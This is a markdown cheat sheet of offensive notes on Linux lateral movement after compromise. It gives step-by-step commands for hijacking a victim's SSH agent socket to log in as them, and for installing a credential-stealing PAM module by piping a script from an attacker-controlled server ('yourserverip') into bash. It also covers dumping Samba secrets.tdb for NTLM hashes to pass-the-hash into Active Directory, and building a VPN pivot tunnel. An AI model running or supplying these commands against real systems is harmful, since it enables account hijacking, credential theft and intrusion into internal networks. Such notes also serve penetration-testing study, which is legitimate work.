# Notes---Linux-Exploitation---Lateral-Movement
## SSH Hijacking
- SSH-agent:
```bash
https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=dfe66853-a519-4b96-81b6-e7cbbdfc8c53&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments
```
- Step of the attack:
```bash
Step 1: We first determine the SSH process ID of the user on the compromised host:
> ps aux |grep sshd
Step 2: Next, we determine the SSH_AUTH_SOCK environment variable for the sshd PID:
> grep SSH_AUTH_SOCK /proc/<PID>/environ
Step 3: We then hijack the targets ssh-agent socket:
> SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add –l
Step 4: Finally, we log into the remote system our victim is logged into as the target:
> ssh remotesystem -l victim

More info:
https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/
```
## Stealing SSH Credentials`
- Collect as many credentials as possible in order to move laterally leveraging credential reuse cases:
- Through malicious PAM module, every SSH connection attempt will be forwarded to a server under your control, accompanied by the credentials used for this connection attempt;
```bash
https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==

attacking machine:
> git clone https://github.com/mthbernardes/sshLooter.git 
> cd sshLooter

compromised machine:
> curl http://yourserverip:8000/install.sh | bash

Try the captured credentials against other identified machines in the network!
```
## Samba Secrets to Domain Admin
- When a new Samba user is created, this information is usually stored in what is known as the `secrets.tdb` file.
- Samba version 4.7.4 on Debian, the secrets.tdb file is stored in the `/var/lib/samba/private` directory.
- we’re root on a machine, we can use the `tdbdump` command to dump the information in the `secrets.tdb`
```bash
tdbdump /var/lib/samba/private/secrets.tdb
```
-  decode the results of the tdbdump UTF8 encoded "data" fields to obtain the NTLM hash for the Samba computer account and ultimately pass-the-hash to Active Directory using `pth-smbclient` from the pth-toolkit:
- following link which shows us how we can move from the Samba server to Active Directory:
```bash
https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9
```
## VPNPivot
- VPNPivot creates a VPN tunnel between the attacker and compromised Linux host, and allows pivoting to other hosts internally within an organization that may be behind firewalls, NAT configurations, etc:
```bash
./autogen.sh
./configure
make && make install

./src/pivots -h

https://github.com/0x36/VPNPivot
```
